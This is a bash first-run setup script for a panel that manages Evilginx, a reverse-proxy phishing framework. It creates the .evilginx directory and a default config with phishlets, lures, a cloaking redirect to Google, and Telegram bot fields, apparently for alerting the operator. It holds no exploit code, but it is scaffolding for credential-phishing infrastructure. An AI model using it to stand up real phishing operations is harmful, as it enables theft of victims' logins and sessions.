#!/bin/bash

# initial_setup.sh
# IMPORTANT: This script is meant to be run ONLY ONCE during initial setup.
# It will create the .evilginx directory and populate it with minimal default files.
# This should NOT be run during regular panel startup - it's only for first-time setup.

# Configuration
CURRENT_USER=$(whoami)
GROUP=$(id -gn)
HOME_DIR=$HOME
WORKSPACE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)"
EVILGINX_DIR="$WORKSPACE_DIR/.evilginx"
PANEL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
DATA_DIR="$PANEL_DIR/data"

# Print colored output for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log() {
  echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"
}

error() {
  echo -e "${RED}[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
}

warning() {
  echo -e "${YELLOW}[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
}

info() {
  echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] INFO: $1${NC}"
}

# Print header and warning
echo -e "${RED}=================================================================${NC}"
echo -e "${RED}          INITIAL SETUP SCRIPT - FOR FIRST USE ONLY             ${NC}"
echo -e "${RED}=================================================================${NC}"
echo ""
warning "This script is meant to be run ONLY ONCE during initial setup."
warning "It will create the .evilginx directory and populate it with default files."
warning "If you already have a configured .evilginx directory, DO NOT RUN THIS SCRIPT!"
warning "It may overwrite your existing configuration."
echo ""
read -p "Are you sure you want to proceed with initial setup? (yes/no): " confirmation
if [[ "$confirmation" != "yes" ]]; then
  echo "Setup cancelled. No changes made."
  exit 1
fi

echo ""
log "Starting initial setup..."

# Create necessary directories
log "Creating directories..."
mkdir -p "$EVILGINX_DIR"
mkdir -p "$EVILGINX_DIR/crt"
chmod 755 "$EVILGINX_DIR"
chmod 755 "$EVILGINX_DIR/crt"
chown $CURRENT_USER:$GROUP "$EVILGINX_DIR"
chown $CURRENT_USER:$GROUP "$EVILGINX_DIR/crt"

# Files to create in .evilginx
FILES_TO_CREATE=(
  "blacklist.txt"
  "config.json"
  "data.db"
)

# Create initial files in .evilginx directory
log "Creating initial files in .evilginx directory..."

for file in "${FILES_TO_CREATE[@]}"; do
  evilginx_file="$EVILGINX_DIR/$file"
  
  # Check if file already exists - DO NOT OVERWRITE
  if [[ -f "$evilginx_file" ]]; then
    warning "File $file already exists in .evilginx directory."
    read -p "Do you want to overwrite it? (yes/no): " overwrite
    if [[ "$overwrite" != "yes" ]]; then
      info "Keeping existing $file"
      continue
    else
      info "Creating backup of existing file: ${evilginx_file}.bak"
      cp "$evilginx_file" "${evilginx_file}.bak"
    fi
  fi
  
  log "Creating $file in .evilginx directory..."
  
  if [[ "$file" == "config.json" ]]; then
    # Create a properly structured config.json with required fields
    cat > "$evilginx_file" << EOF
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "domain": "",
    "external_ipv4": "",
    "bind_ipv4": "",
    "unauth_url": "https://www.google.com",
    "https_port": 443,
    "dns_port": 53,
    "autocert": true,
    "telegram_bot_token": "",
    "telegram_chat_id": ""
  },
  "phishlets": {},
  "lures": []
}
EOF
  elif [[ "$file" == "blacklist.txt" ]]; then
    # Create empty blacklist file with comment header
    cat > "$evilginx_file" << EOF
# Blacklist configuration file
# Format: IP or CIDR notation per line
# Example: 192.168.1.1 or 10.0.0.0/8
EOF
  elif [[ "$file" == "data.db" ]]; then
    # Create empty SQLite database file
    touch "$evilginx_file"
  fi
  
  chmod 644 "$evilginx_file"
  chown $CURRENT_USER:$GROUP "$evilginx_file"
  log "Created $file in .evilginx directory"
done

# Now run the init_sync_watch.sh script to create the symlinks
log "Setting up symlinks..."
"$DATA_DIR/init_sync_watch.sh"

log "Initial setup completed successfully!"
echo ""
info "You can now start the panel using: cd '$PANEL_DIR' && npm run dev"
info "Remember: Do not run this script again unless you want to reset your configuration."
echo ""
echo -e "${GREEN}=================================================================${NC}"
echo -e "${GREEN}                    SETUP COMPLETED                            ${NC}"
echo -e "${GREEN}=================================================================${NC}" 